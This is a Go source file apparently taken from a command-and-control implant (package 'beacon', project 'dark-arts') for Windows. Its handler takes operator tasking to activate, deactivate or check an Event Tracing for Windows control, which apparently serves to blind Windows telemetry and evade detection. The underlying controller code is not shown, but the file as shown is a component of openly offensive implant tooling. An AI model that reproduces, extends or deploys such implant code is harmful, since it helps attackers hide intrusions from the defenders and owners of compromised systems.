//go:build windows && amd64

package beacon

import (
	"encoding/json"
	"fmt"

	"dark-arts/pkg/tasking"
)

func (e *Executor) runETW(payload []byte, res *tasking.Result) {
	var p struct {
		Action string `json:"action"`
	}
	if err := json.Unmarshal(payload, &p); err != nil {
		res.Error = err.Error()
		return
	}
	if p.Action == "" {
		res.Error = "beacon: etw requires action (activate|deactivate|status)"
		return
	}

	ctrl := e.etwCtrl
	if ctrl == nil {
		res.Error = "beacon: etw control not configured"
		return
	}

	switch p.Action {
	case "activate":
		if err := ctrl.Enable(); err != nil {
			res.Error = fmt.Sprintf("beacon: etw enable: %v", err)
			return
		}
		res.Output = []byte(fmt.Sprintf(`{"status":"%s"}`, ctrl.Status()))
	case "deactivate":
		if err := ctrl.Disable(); err != nil {
			res.Error = fmt.Sprintf("beacon: etw disable: %v", err)
			return
		}
		res.Output = []byte(fmt.Sprintf(`{"status":"%s"}`, ctrl.Status()))
	case "status":
		res.Output = []byte(fmt.Sprintf(`{"status":"%s"}`, ctrl.Status()))
	default:
		res.Error = fmt.Sprintf("beacon: etw unknown action %q (use activate|deactivate|status)", p.Action)
	}
}
